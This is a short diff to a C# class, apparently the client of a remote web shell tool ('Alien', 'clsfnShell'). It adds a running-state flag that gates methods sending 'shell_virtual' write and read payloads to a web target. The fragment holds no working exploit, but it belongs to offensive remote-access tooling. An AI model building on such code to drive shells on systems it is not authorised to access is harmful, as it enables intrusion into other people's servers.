@@ -10,6 +10,7 @@ namespace Alien
     {
         private clsWeb m_web { get; set; }
         public string m_szCurrentDir { get; set; }
+        public bool m_bIsRunning { get; set; } = false;
 
         public clsfnShell(clsWeb web)
         {
@@ -78,6 +79,9 @@ namespace Alien
         {
             try
             {
+                if (!m_bIsRunning)
+                    return false;
+
                 string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "write", szB64Data });
                 return szResp.Contains("success");
             }
@@ -104,6 +108,9 @@ namespace Alien
         {
             try
             {
+                if (!m_bIsRunning)
+                    return string.Empty;
+
                 string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "read" });
                 return szResp;
             }
